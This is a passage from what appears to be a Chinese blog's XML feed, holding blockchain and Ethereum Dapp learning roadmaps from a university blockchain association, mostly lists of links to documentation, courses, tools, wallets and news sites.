title="二、开发框架"></a>二、开发框架</h3><p>上文讲到，开发者如果想要跟以太坊交互，需要借助客户端来搭建节点才行。理论上虽然如此，但不禁想一下，如果每次开发都要手动搭建节点，且面向不同以太坊网络时还应重新搭建，未免给我们的开发增添了太多不必要的负担，对开发者的技术要求也更加严格，这显然是不利于以太坊乃至区块链技术的普及。</p><p>互联网软件开发的历史已有数十年之久。我们受益于半个世纪以来积累的最佳实践，设计模式和智慧。相反，智能合约开发才刚刚开始。2015 推出的以太坊和 Solidity 仅有几年的时间。在智能合约刚推出的前几年，没有确定的工具堆栈来帮助开发者部署智能合约以及构建去中心化应用。</p><p>但随着区块链技术的蓬勃发展以及广大开发者极客们的集思广益，诸如 Truffle、Hardhat 的 Dapp 开发框架应用的出现，极大的方便了开发者与区块链的交互，丰富了整个以太坊生态系统。</p><h4 id="Truffle"><a href="#Truffle" class="headerlink" title="- Truffle"></a>- Truffle</h4><p>Truffle 是第一套基于以太坊的 Solidity 语言的成熟的开发框架。本身是基于 JavaScript。它对客户端做了深度集成，使开发、测试、部署都只需要一个命令行，可以在控制台使用命令行直接调用输出结果，方便调试。<br>Truffle 是本地编译、部署智能合约的框架；而向前文中提到的 geth 客户端连接的才是真正的以太坊环境；testrpc 是 Truffle 本地使用内存模拟的以太坊环境，关闭终端后，部署到 testrpc 的智能合约不会保存下来，对于开发调试更加方便，合约可以在 testrpc 中通过测试后，再部署到 geth 上，从而减少不必要的损失。</p><ul><li>Truffle：<a href="https://learnblockchain.cn/docs/truffle/quickstart.html">🔗</a></li></ul><h4 id="Hardhat"><a href="#Hardhat" class="headerlink" title="- Hardhat"></a>- Hardhat</h4><p>Hardhat 是一个编译、部署、测试和调试以太坊应用的开发环境。它可以帮助开发者管理和自动化构建智能合约和 dApps 过程中固有的重复性任务，并围绕这一工作流程轻松引入更多功能。<br>Hardhat 内置了 Hardhat 网络，这是一个专为开发设计的本地以太坊网络。主要功能有 Solidity 调试，跟踪调用堆栈、console.log()和交易失败时的明确错误信息提示等，其在智能合约的 Debug 调试过程的交互性要优于 Truffle。<br>除此之外，与 Truffle 不同的是，Hardhat 是一款基于插件的开发框架，其很多功能都来自于插件，开发者可以自由选择想使用的插件，甚至还可以将现有的 Truffle 项目迁移到 Hardhat 上。</p><ul><li>Hardhat：<a href="https://learnblockchain.cn/docs/hardhat/getting-started">🔗</a></li></ul><h3 id="三、Dapp-开发"><a href="#三、Dapp-开发" class="headerlink" title="三、Dapp 开发"></a>三、Dapp 开发</h3><h4 id="什么是-Dapp"><a href="#什么是-Dapp" class="headerlink" title="什么是 Dapp?"></a>什么是 Dapp?</h4><p>App 我们都知道是客户端应用，是 application 的简称。DApp 就是 D+App，D 是英文单词 decentralization 的首字母，单词翻译中文是去中心化，即 DApp 为去中心化应用。</p><p>看到这里，大家思维中第一反应可能是，为什么要有 DApp，现在的 App 不是挺好吗？其实，两者并不是取代关系，而是并存关系，或者说 DApp 是对 App 的丰富和完善。因为 DApp 是依托于区块链底层技术的上层建筑，它和交易数据、交易资产有关联，和不可篡改去中心化存储也有关联，所以随着区块链技术越来越成熟普及，DApp 也更受到人们的青睐与期望，并更多地出现在各个生活场景中，如生产链防伪，捐款资金流向等等。</p><p><img src="/./pic/10.png"></p><p>那么作为一名开发者，是开发一款自己的 Dapp 需要做的具体步骤是什么？<br>Dapp 的一般开发流程：</p><ol><li>创建自己的 Web3.0 钱包</li><li>使用 Solidity 编写智能合约代码</li><li>通过 Dapp 开发框架如 Hardhat、Truffle，通过 node.js 测试合约并部署</li><li>编写前端界面，并通过如 ether.js、web3.js 与智能合约进行交互</li><li>项目发布与测试</li></ol><ul><li>node.js 介绍文档：<a href="https://www.runoob.com/nodejs/nodejs-tutorial.html">🔗</a></li><li>ether.js 中文文档：<a href="https://learnblockchain.cn/docs/ethers.js">🔗</a></li><li>web3.js(1.0)中文文档：<a href="http://cw.hubwiz.com/card/c/web3.js-1.0/1/1/1/">🔗</a></li></ul><h2 id="常用工具及网站"><a href="#常用工具及网站" class="headerlink" title="常用工具及网站"></a>常用工具及网站</h2><h3 id="一、数据查询"><a href="#一、数据查询" class="headerlink" title="一、数据查询"></a>一、数据查询</h3><ul><li>Etherscan —以太坊区块链浏览器：<a href="https://etherscan.io/">🔗</a></li><li>Ethereum Signature Database —EVM 调用记录数据库：<a href="https://www.4byte.directory/">🔗</a></li><li>ENS —以太坊域名系统：<a href="https://app.ens.domains/">🔗</a></li></ul><h3 id="二、合约开发"><a href="#二、合约开发" class="headerlink" title="二、合约开发"></a>二、合约开发</h3><ul><li>ChainIDE —支持多链的在线合约开发工具：<a href="https://chainide.com/zh-CN">🔗</a></li><li>Chainlist —EVM 网络列表：<a href="https://chainlist.org/">🔗</a></li><li>The Graph —链上数据获取：<a href="https://thegraph.com/">🔗</a></li><li>Chainlink —第三方预言机：<a href="https://docs.chain.link/">🔗</a></li><li>Alchemy —第三方节点提供商：<a href="https://dashboard.alchemyapi.io/signup/chain">🔗</a></li></ul><h3 id="三、社区交流"><a href="#三、社区交流" class="headerlink" title="三、社区交流"></a>三、社区交流</h3><ul><li>登链社区 —区块链开发者论坛：<a href="https://learnblockchain.cn/">🔗</a></li><li>巴比特 —区块链资讯平台：<a href="https://www.8btc.com/">🔗</a></li><li>Ethereum —以太坊基金会官方开发网站：<a href="https://ethereum.org/en/developers">🔗</a></li><li>Stack Overflow —程序开发交流社区：<a href="https://stackoverflow.com/">🔗</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>Road</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>Road</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>02-以太坊</title>
    <link href="/2024/08/02/BlockChain/Road/02-%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    <url>/2024/08/02/BlockChain/Road/02-%E4%BB%A5%E5%A4%AA%E5%9D%8A/</url>
    
    <content type="html"><![CDATA[<h1 id="ETHer-developer-roadmap-2024"><a href="#ETHer-developer-roadmap-2024" class="headerlink" title="ETHer-developer-roadmap 2024"></a>ETHer-developer-roadmap 2024</h1><p>以太坊 Dapp 开发学习路线</p><p>—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）</p><h2 id="以太坊技术原理"><a href="#以太坊技术原理" class="headerlink" title="以太坊技术原理"></a>以太坊技术原理</h2><h3 id="初级："><a href="#初级：" class="headerlink" title="初级："></a>初级：</h3><ol><li>以太坊基本概念，Foundational topics 部分：<a href="https://ethereum.org/en/developers/docs/">🔗</a></li><li>利用 geth 搭建私有链并交互：</li><li>利用区块链浏览器 Etherscan 查看区块、交易、合约等信息：<a href="http://etherscan.io/">🔗</a></li><li>智能合约入门，solidity 官方文档 Basic 部分：<a href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html">🔗</a></li><li>以太坊知识库：<a href="https://learnblockchain.cn/eth/">🔗</a></li><li>文章：分析 solidity 智能合约在EVM底层的存储架构，介绍不同的数据类型存储的地址槽和所占的大小 <a href="https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage">🔗</a></li></ol><h3 id="中级："><a href="#中级：" class="headerlink" title="中级："></a>中级：</h3><ol><li>以太坊开发文档，Ethereum stack 部分：<a href="https://ethereum.org/en/developers/docs/">🔗</a></li><li>《精通以太坊》书籍<ol><li>英文版：<a href="https://github.com/ethereumbook/ethereumbook">🔗</a></li><li>中文版：<a href="https://github.com/inoutcode/ethereum_book">🔗</a></li></ol></li><li>以太坊白皮书（optional）：<a href="https://ethereum.org/en/whitepaper/">🔗</a></li></ol><h3 id="高级"><a href="#高级" class="headerlink" title="高级"></a>高级</h3><ol><li><strong>以太坊客户端</strong>（建议 Geth）源码分模块阅读与分析：<a href="https://geth.ethereum.org/">🔗</a></li><li><strong>以太坊黄皮书（optional）</strong>：<a href="https://files.gitter.im/ethereum/yellowpaper/VIyt/Paper.pdf">🔗</a></li><li>Layer2、ETH2.0 技术方案阅读与分析：<ol><li><a href="https://ethereum.org/en/developers/docs/scaling/">🔗</a></li><li><a href="https://ethereum.org/en/developers/docs/scaling/layer-2-rollups/">🔗</a></li></ol></li><li>以太坊官网上（各路大佬们写）的<strong>blog</strong>：<a href="https://blog.ethereum.org/archive/">🔗</a></li></ol><h3 id="EVM"><a href="#EVM" class="headerlink" title="EVM"></a>EVM</h3><ol><li>深潜 EVM 系列(EVM Deep Dives)文章：<a href="https://substack.com/profile/80455042-noxx">🔗</a><ul><li>EVM 的函数选择原理：<a href="https://learnblockchain.cn/article/3647">🔗</a></li><li>EVM 中的内存数据区：<a href="https://learnblockchain.cn/article/3684">🔗</a></li></ul></li><li>…</li></ol><h2 id="智能合约开发"><a href="#智能合约开发" class="headerlink" title="智能合约开发"></a>智能合约开发</h2><h3 id="初级"><a href="#初级" class="headerlink" title="初级"></a>初级</h3><ol><li>掌握“以太坊技术原理部分”初中级 75%以上内容</li><li>了解开发工具：2022 十大智能合约开发工具<a href="https://learnblockchain.cn/article/3434">🔗</a></li><li>以太坊开发教程（optional）：<a href="https://ethereum-blockchain-developer.com/000-learn-ethereum/">🔗</a></li><li>*Cryptozombies —玩游戏的方式学习 Solidity：<a href="https://cryptozombies.io/">🔗</a></li></ol><h3 id="中级"><a href="#中级" class="headerlink" title="中级"></a>中级</h3><h4 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h4><ol><li>solidity 开发文档：<a href="https://docs.soliditylang.org/en/latest/">🔗</a></li><li>Openzeppelin 文档（✨）：<a href="https://docs.openzeppelin.com/contracts/4.x/">🔗</a></li><li>一种前端 API：<ol><li>web3.js: <a href="https://web3js.readthedocs.io/en/v1.7.1/">🔗</a></li><li>ethers.js: <a href="https://docs.ethers.io/v5/">🔗</a></li><li>对比分析：<a href="https://blog.infura.io/ethereum-javascript-libraries-web3-js-vs-ethers-js-part-i/">🔗</a></li><li>…</li></ol></li><li>一种合约开发框架：<ol><li>Truffle: <a href="https://trufflesuite.com/">🔗</a></li><li>Hardhat: <a href="https://hardhat.org/">🔗</a></li><li>Brownie: <a href="https://eth-brownie.readthedocs.io/en/stable/">🔗</a></li></ol></li><li>…</li></ol><h4 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h4><ol><li>以太坊智能合约——最佳安全开发指南：<a href="https://consensys.github.io/smart-contract-best-practices/">🔗</a></li><li>智能合约攻击示例：<a href="https://github.com/kadenzipfel/smart-contract-attack-vectors">🔗</a></li><li>BlockSec：<a href="https://www.blocksecteam.com/">🔗</a></li></ol><h2 id="链上数据"><a href="#链上数据" class="headerlink" title="链上数据"></a>链上数据</h2><ol><li><em>The Graph —链上数据获取：</em><a href="https://thegraph.com/">🔗</a></li><li><em>Chainlist —EVM 网络列表：</em><a href="https://chainlist.org/">🔗</a></li></ol><h2 id="常用工具和网站"><a href="#常用工具和网站" class="headerlink" title="常用工具和网站"></a>常用工具和网站</h2><h3 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h3><ol><li>Solhint：一种静态检查器，提供安全和风格指南以及智能合约验证的最佳实践规则。</li><li><a href="https://dapp.tools/">Dapptools</a>： 一套专注于以太坊的 CLI 工具，遵循 Unix 设计理念，倾向于可组合、可配置和可扩展性。</li></ol><h3 id="社区"><a href="#社区" class="headerlink" title="社区"></a>社区</h3><ol><li><em>登链社区 —区块链开发者社区：</em><a href="https://learnblockchain.cn/">🔗</a></li><li>Stack Overflow —程序开发交流社区：<a href="https://stackoverflow.com/">🔗</a></li><li>Stack Exchange —以太坊开发交流社区：<a href="https://ethereum.stackexchange.com/">🔗</a></li></ol><h3 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h3><ol><li>awesome-openzeppelin: <a href="https://github.com/OpenZeppelin/awesome-openzeppelin">🔗</a></li><li>区块链 Dapp 开发教程：<a href="https://github.com/Dapp-Learning-DAO/Dapp-Learning">🔗</a></li></ol><h3 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h3><ol><li>EIP&#x2F;ERC：<a href="https://dev.ethereum.cn/eips-1/">🔗</a></li><li>以太坊维基百科：<a href="https://eth.wiki/">🔗</a></li><li>layer2 方案的备忘录：<a href="https://mirror.xyz/ethmaxitard.eth/iyCAlOexgQKOvoSAAk4utYGEdnESOKb5HstM2_LaqL4">🔗</a></li><li>ethereum-input-data-decoder：<a href="https://lab.miguelmota.com/ethereum-input-data-decoder/example/">🔗</a></li><li>evm 字节码：<a href="https://www.evm.codes/">🔗</a></li><li>加密协议列表：<a href="https://github.com/bryanhpchiang/protocol-reading-list">🔗</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>Road</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>Road</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>01-区块链基本路线</title>
    <link href="/2024/08/02/BlockChain/Road/01-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E6%9C%AC%E8%B7%AF%E7%BA%BF/"/>
    <url>/2024/08/02/BlockChain/Road/01-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E6%9C%AC%E8%B7%AF%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="blockchainer-roadmap-2024"><a href="#blockchainer-roadmap-2024" class="headerlink" title="blockchainer-roadmap 2024"></a>blockchainer-roadmap 2024</h1><p>区块链者学习路线 2024🚀🚀🚀🚀</p><p>—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）</p><p>在总结过往学习资料、路线的基础上，结合最新的区块链前沿技术，制定了本学习路线 🎨。</p><h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><p>区块链入门</p><ul><li><strong>纪录片</strong><ul><li>《区块链之新》6 集，小小名人录 <a href="https://www.bilibili.com/bangumi/play/ep290332?from=search&seid=4820733908948631673">🔗</a></li></ul></li><li><strong>网课</strong><ul><li>区块链技术与应用，北大肖臻老师出品，内容极佳 <a href="https://www.bilibili.com/video/av37065233">🔗</a> 笔记 <a href="https://github.com/CSWellesSun/CSNotes/blob/main/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/Note/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8.md">🔗</a></li><li>WTF Academy，开发者的 Web3 开源大学 <a href="https://www.wtf.academy/">🔗</a></li><li>DeFi 去中心化金融，UCB 课程 <a href="https://www.bilibili.com/video/BV1iV4y1T7iL/">🔗</a></li><li>DAPP 开发入门，新手友好 <a href="https://guoyu.mirror.xyz/RD-xkpoxasAU7x5MIJmiCX4gll3Cs0pAd5iM258S1Ek">🔗</a></li><li>Crypto Zombie，通过完成一个小游戏来学习 DAPP 开发 <a href="https://cryptozombies.io/">🔗</a></li><li>Solidity 入门，以太坊开发 <a href="https://blog.chain.link/learn-blockchain-full-stack-web3-javascript-smart-contract-development-zh/">🔗</a></li><li>ZK 入门 <a href="https://zkhack.dev/whiteboard/module-one/">🔗</a> 还有个没什么公式代码的书<a href="https://learn.z2o-k7e.world/zkp-intro/toc.html">🔗</a></li></ul></li><li><strong>书籍</strong><ul><li>《Mastering Bitcoin》，公认的区块链 1.0 的最好的书，涉及技术部分也较多 <a href="https://berryjam.gitbook.io/mastering-bitcoin-3rd">🔗</a></li><li>《Inevitable Ethereum》<a href="https://inevitableeth.com/">🔗</a> 以太坊基本概念的科普</li><li>《区块链黑暗森林自救手册》<a href="https://github.com/slowmist/Blockchain-dark-forest-selfguard-handbook">🔗</a> 慢雾出品，降低资产风险</li><li>《区块链红宝书–最接地气的币圈词典》<a href="https://www.btc8686.com/wp-content/uploads/2022/02/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%BA%A2%E5%AE%9D%E4%B9%A6%E6%96%B0.pdf">🔗</a> 《Web3 黑话汇总》<a href="https://github.com/WTFAcademy/WTF-gm">🔗</a> 一些常用的缩写</li></ul></li><li><strong>常用数字货币钱包</strong><ul><li>MetaMusk：EVM 最常用钱包 <a href="https://metamask.io/">🔗</a></li><li>OKX：支持公链最多，用户体验极好 <a href="https://www.okx.com/zh-hans/web3">🔗</a></li><li>Unisat：BTC 常用钱包 <a href="https://unisat.io/">🔗</a></li><li>Phantom：SOL 常用钱包 <a href="https://phantom.app/">🔗</a></li><li>Trust Wallet <a href="https://www.trustwallet.com/">🔗</a></li><li>其他 <a href="https://www.coincarp.com/zh/wallets/">🔗</a></li></ul></li><li><strong>常用数字货币行情软件</strong><ul><li>CoinGecko <a href="https://www.coingecko.com/">🔗</a></li><li>CoinMarkCap <a href="https://coinmarketcap.com/">🔗</a></li></ul></li><li><strong>主流交易所</strong><ul><li>CEX<ul><li>币安 <a href="https://www.binance.com/zh-CN">🔗</a></li><li>OKX <a href="https://www.okx.com/">🔗</a></li><li>其他 <a href="https://www.coincarp.com/zh/exchanges/">🔗</a></li></ul></li><li>DEX<ul><li>EVM DEX：Uniswap <a href="https://uniswap.org/">🔗</a></li><li>SOL DEX：Raydium <a href="https://raydium.io/">🔗</a> Jupiter <a href="https://jup.ag/">🔗</a></li><li>PancakeSwap，支持多链 <a href="https://pancakeswap.finance/">🔗</a></li><li>其他 <a href="https://www.coincarp.com/zh/exchanges/dex/">🔗</a></li></ul></li><li>NFT 市场<ul><li>ETH 市场：Opensea <a href="https://opensea.io/">🔗</a> Blur <a href="https://blur.io/">🔗</a></li><li>MagicEden：多链，包括 BTC NFT 和符文 <a href="https://magiceden.io/">🔗</a></li><li>OKX Web3 Marketplace：多链，包括 BTC NFT、铭文、符文和 Atom <a href="https://www.okx.com/zh-hans/web3/marketplace/nft">🔗</a></li><li>铭文、符文、Atom、RGB 市场<ul><li>OKX：最主流使用的 Web3 市场 <a href="https://www.okx.com/zh-hans/web3/marketplace/nft">🔗</a></li><li>Unisat Market <a href="https://unisat.io/market">🔗</a></li><li>RGB 市场仍在发展：HueHub <a href="https://huehub.xyz/">🔗</a> Nomadland <a href="https://market.nomadland.io/#/trade/info?id=0">🔗</a></li></ul></li></ul></li></ul></li><li><strong>社交媒体资讯</strong><ul><li>X (Twitter)<ul><li>吴说 <a href="https://twitter.com/WuBlockchain">🔗</a></li><li>Twitter 加密货币消息聚合平台 <a href="https://www.coinfeeds.io/news">🔗</a></li></ul></li><li>网站<ul><li>cointelegraph <a href="https://cointelegraph.com/">🔗</a></li><li>the block <a href="https://www.theblock.co/">🔗</a></li><li>web3Caff <a href="https://web3caff.com/zh/">🔗</a></li><li>Medium <a href="https://medium.com/">🔗</a></li><li>登链社区 <a href="https://learnblockchain.cn/">🔗</a></li><li>比特币生态资源导航 <a href="https://123btc.org/">🔗</a></li></ul></li><li>Newsletter<ul><li>coinbase 每周咨询 <a href="https://www.coinbase.com/bytes">🔗</a></li><li>TLDR Newsletter (5min 科技新闻) <a href="https://tldr.tech/">🔗</a></li></ul></li><li>媒体：<ul><li>Foresight News <a href="https://foresightnews.pro/">🔗</a></li><li>Odaily 星球日报 <a href="https://www.odaily.news/">🔗</a></li><li>BlockBeats <a href="https://theblockbeats.info/">🔗</a></li><li>PANews <a href="https://www.panewslab.com/">🔗</a></li><li>TechFlow 深潮 <a href="https://www.techflowpost.com/">🔗</a></li></ul></li></ul></li><li><strong>风险须知</strong><ul><li>遵守国家法律法规！</li><li>dyor，都是可选项，不是必选项。</li></ul></li></ul><h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2><p>有了入门的基础后，其实接下去都是一些可选的专题，对其中感兴趣的专题可以进行了解与学习。</p><ul><li><p><strong>技术向</strong>：</p><ul><li><p>密码学：</p><ul><li>文章：介绍了简单的 <code>secp256k1</code>签名算法、比特币交易签名、 <code>schnorr</code> 多签 <a href="https://www.btcstudy.org/2022/06/13/part-2-bitcoin-p2tr-transaction-breakdown/">🔗</a></li><li><a href="https://github.com/paulmillr/noble-secp256k1">noble-secp256k1</a>：<code>secp256k1</code> 签名和 <code>ECDH</code> 的最快 4KB JS 实现。极其简洁，但内容完整且经过算法优化，非常适合从底层了解签名算法。作者还专门写了一篇介绍椭圆曲线算法加速的文章 <a href="https://paulmillr.com/posts/noble-secp256k1-fast-ecc/">🔗</a></li><li>文章：介绍基于 <code>schnorr</code> 签名算法的 <code>musig</code> 多签名，可用于设计链下多签名。<a href="https://blog.blockstream.com/en-musig-a-new-multisignature-standard/">🔗</a> 这里还有一个 typescript 的实现 <a href="https://github.com/wangshouh/musig">🔗</a></li></ul></li><li><p>共识算法：</p><ul><li>PoW 相关：<a href="https://github.com/indutny/proof-of-work">🔗</a></li><li>PoS：<a href="https://github.com/ethereum/consensus-specs">🔗</a></li><li>PBFT：<a href="https://pmg.csail.mit.edu/papers/osdi99.pdf">🔗</a></li><li>dpos+pbft 算法分析：<a href="https://github.com/sqfasd/dpos-pbft">🔗</a></li><li>PoH：<a href="https://docs.solanalabs.com/implemented-proposals/tower-bft#vote-tower">🔗</a></li><li>DAG：<ul><li>IOTA：<a href="https://docs.iota.org/introduction">🔗</a></li><li>Byteball：<a href="https://byteball.org/">🔗</a></li></ul></li></ul></li><li><p>智能合约：</p><ul><li>智能合约开发是区块链应用的基础，不同区块链平台的智能合约可能不太一样，但是大多数都是借鉴了以太坊的智能合约，对于公有链领域，搞懂以太坊及其智能合约是首要的。和前面一样，可以去阅读以太坊的官方文档，也可以看一些书。</li><li>以太坊官方文档：<a href="https://ethereum.org/en/developers/docs/">🔗</a></li><li>Solidity 最新文档（可以切换版本查看其他版本的文档）：<a href="https://docs.soliditylang.org/en/latest/">🔗</a></li><li>书籍：《精通以太坊》<a href="https://github.com/ethereumbook/ethereumbook">🔗</a>，主要就是介绍以太坊，以及如何在以太坊上写智能合约，以太坊 CTO 著，好书，至今依然在更新</li><li>除了以太坊以外，还可以了解波卡、Polygon 和 Dfinity 等公有区块链。对于联盟链的智能合约，如 Hyperledger Fabric，可以自行找一些书或者文档看。</li><li>以太坊 Dapp 开发学习路线：<a href="eth/eth_dapp.md">🔗</a></li><li>SOL 开发教程，非常详细 <a href="https://www.soldev.app/course">🔗</a></li></ul></li><li><p>虚拟机：</p><ul><li>evm<ul><li>evm-awesome-list：<a href="https://ethereum.org/en/developers/docs/evm/">🔗</a>，以太坊开发者官方文档</li><li>evm 解析：<a href="https://github.com/CoinCulture/evm-tools/blob/master/analysis/guide.md">🔗</a>，这是了解 EVM、它与 Solidity 的关系以及如何使用一些调试工具的指南。</li><li>文章：使用 yul 汇编深入理解 solidity 和 evm 的底层技术 <a href="https://mirror.xyz/0xB38709B8198d147cc9Ff9C133838a044d78B064B/nk40v2MJKSHXXNSlbqqhpwJf4MtZ9V2Vp8P_bSNwjYc">🔗</a>, 小白科普向，一共有三篇</li><li><a href="https://www.evm.codes/">EVM Codes</a>：探索 evm 和 solidity 底层必备工具，可以快速查找 Opcodes 操作码和 Precompiled 预编译函数的具体功能、用法和 gas 情况。另一个有用的工具是 <a href="https://book.getfoundry.sh/forge/debugger">forge debugger</a></li></ul></li><li>wasm（WebAssembly）<ul><li>eth-ewasm：<a href="https://github.com/ewasm">🔗</a></li></ul></li></ul></li><li><p>去中心化存储</p><ul><li>IPFS&#x2F;Filecoin：<a href="https://github.com/Blockchain-zju/blockchainer-roadmap/tree/master/ipfs">🔗</a></li></ul></li><li><p>跨链：</p><ul><li>跨链是目前区块链最前沿的技术，也是未来发展的重要方向之一</li><li>论文：V 神总结的区块链互操作性文章：Buterin V. Chain interoperabilit <a href="https://www.r3.com/wp-content/uploads/2017/06/chain_interoperability_r3.pdf">🔗</a></li><li>一些不错的博客文章：<ul><li>关于跨链技术的分析与思考：<a href="https://mp.weixin.qq.com/s/fgRPwzVPB3Si5aHSCACvAg">🔗</a></li><li>跨链通信简要研究：<a href="https://mp.weixin.qq.com/s/X7ztDBG6kqgrBaGwrrsfQw">🔗</a></li></ul></li><li>论文：Polkadot 最新的论文：Overview of Polkadot and its Design Considerations<a href="https://eprint.iacr.org/2020/641.pdf">🔗</a></li><li>国际最领先的跨链平台 Polkadot 源码（rust）：<a href="https://github.com/paritytech/polkadot">🔗</a></li><li>国内最领先的跨链平台 BitXHub 源码（go）：<a href="https://github.com/meshplus/bitxhub">🔗</a></li><li>有兴趣有精力的还可以了解下 Subtrate：<a href="https://substrate.dev/">🔗</a></li></ul></li><li><p>DeFi</p><ul><li>安全<ul><li>文章：16个 solidity合约漏洞，修复和真实世界的案例 <a href="https://hackernoon.com/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148">🔗</a></li><li>工具：<ul><li><a href="https://github.com/SunWeb3Sec/DeFiHackLabs">DeFiHackLabs</a>：收录了很多资安事件的概念性验证程序</li><li><a href="https://github.com/SunWeb3Sec/DeFiVulnLabs">DeFiVulnLabs</a>：整理了常见Solidity的漏洞测试与防御方式</li></ul></li></ul></li><li>实现</li></ul></li><li><p>MEV</p></li><li><p><strong>联盟链</strong>：</p><ul><li><strong>联盟链学习 roadmap - 第一层</strong>：<a href="consortium/consortium.md">🔗</a></li><li>联盟链领域只要搞懂了 Hyperledger Fabric、R3 Corda 这两个项目的东西基本上就搞懂了 80%的内容；学习方式可以是直接阅读这些项目上的文档、其他人写的博客、或者看书。</li><li>Hyperledger Fabric 官方文档：<a href="https://hyperledger-fabric.readthedocs.io/en/latest/">🔗</a></li><li>书籍《区块链技术进阶实战》（豆瓣介绍<a href="https://book.douban.com/subject/30177480/">🔗</a>，介绍了 Hyperledger Fabric、以太坊、Hyperchain）</li><li>书籍《区块链原理、设计与应用》（豆瓣介绍<a href="https://book.douban.com/subject/27127839/">🔗</a>，全书都是在讲 Hyperledger Fabric，有源码分析）</li></ul></li><li><p>具体链相关资源</p><ul><li>ETH<ul><li>eth roadmap - 第一层：<a href="eth/eth.md">🔗</a></li></ul></li></ul></li></ul></li><li><p><strong>商业向</strong>：</p><ul><li>research&#x2F;dataAnalysis：<ul><li>文章：从新闻聚合器到链上分析工具，十大加密研究工具清单 <a href="https://abmedia.io/20220726-the-10-must-have-crypto-research-tools">🔗</a></li><li><a href="https://github.com/chainfeeds/RSSAggregatorforWeb3">🥩 RAW</a>：一个聚合了500多个关于Web3的RSS的仓库，里面讲技术的略少，大量文章关于项目动态</li></ul></li><li>ICO：<ul><li>搜索并了解 ERC-20</li><li>搜索并了解 ICO</li><li>各国对 ICO 的监管态度</li></ul></li><li>爆款区块链应用：<ul><li>搜索并了解加密猫、像素大师</li></ul></li><li>Token：<ul><li>搜索并了解什么是代币经济学</li></ul></li><li>Staking：<ul><li>搜索并了解什么是 Staking Economy</li></ul></li><li><strong>DeFi</strong>：Decentralized Finance<ul><li>搜索并了解什么是 DeFi</li><li>书籍推荐：《How to DeFi》：<a href="https://github.com/Blockchain-zju/HistoryFiles/blob/main/defi/How_to_DeFi_CHN.pdf">🔗</a></li></ul></li><li><strong>NFT</strong>：Non-fungible Token<ul><li><strong>Roadmap-NFT 第一层</strong>：<a href="nft/nft.md">🔗</a></li><li>文章：了解 5 种流行的 NFT 投放方式及其优缺点 <a href="https://web3caff.com/zh/archives/23106">🔗</a></li></ul></li></ul></li></ul><h2 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h2><blockquote><p>越了解，越广阔</p></blockquote><ul><li><p><strong>技术向</strong>：</p><ul><li><p>阅读经典论文&#x2F;文章：</p><ul><li>bitcoin 白皮书：Bitcoin: A Peer-to-Peer Electronic Cash System<a href="https://bitcoin.org/bitcoin.pdf">🔗</a></li><li>以太坊白皮书：Ethereum: A next-generation smart contract and decentralized application platform<a href="https://github.com/ethereum/wiki/wiki/White-Paper">🔗</a><ul><li>如果有能力也应该看下以太坊黄皮书：Ethereum: A secure decentralised generalised transaction ledger<a href="https://ethereum.github.io/yellowpaper/paper.pdf">🔗</a></li><li>以太坊的 wiki：<a href="https://github.com/ethereum/wiki/wiki">🔗</a></li><li>go-ethereum-code-analysis：<a href="https://github.com/ZtesoftCS/go-ethereum-code-analysis">🔗</a></li><li>以太坊源码分析-teaspring 的技术专栏：<a href="https://blog.csdn.net/teaspring">🔗</a></li><li>干货|以太坊分片:overview and finalit：<a href="https://ethfans.org/posts/ethereum-sharding-and-finality">🔗</a></li></ul></li><li>EOS 白皮书：<a href="https://github.com/EOSIO/Documentation/blob/master/TechnicalWhitePaper.md">🔗</a></li><li>Polkadot 白皮书：Polkadot: Vision for a heterogeneous multi-chain framework</li><li>**这 33 篇区块链必读论文 , 读过 5 篇以上的竟不到 1%**：<a href="https://www.chainnews.com/articles/363251574672.htm">🔗</a></li><li>建议可以按照自己感兴趣的主题去<strong>Google Scholar</strong>里搜索，如：blockchain, distribute ledger 等。</li></ul></li><li><p>阅读经典项目源码：</p><ul><li>Bitcoin 源码：<a href="https://github.com/bitcoin/bitcoin">🔗</a></li><li>Ethereum 源码(go-ethereum)：<a href="https://github.com/ethereum/go-ethereum">🔗</a></li><li>EOS 源码：<a href="https://github.com/EOSIO/eos">🔗</a></li><li>Hyperledger Fabric 源码：<a href="https://github.com/hyperledger/fabric">🔗</a></li></ul></li><li><p>ETH2.0：</p><ul><li>了解 ETH1.0 的扩容方案</li><li>了解 ETH2.0 的 Roadmap 路线图</li><li>了解 layer2 和分片的区别</li><li>了解 layer2 最新进展 rollup 的两大方向 optimistic-rollup 和 zk-rollup 的区别</li></ul></li><li><p><strong>联盟链</strong>：</p><ul><li><strong>联盟链学习 roadmap - 第二层</strong>：<a 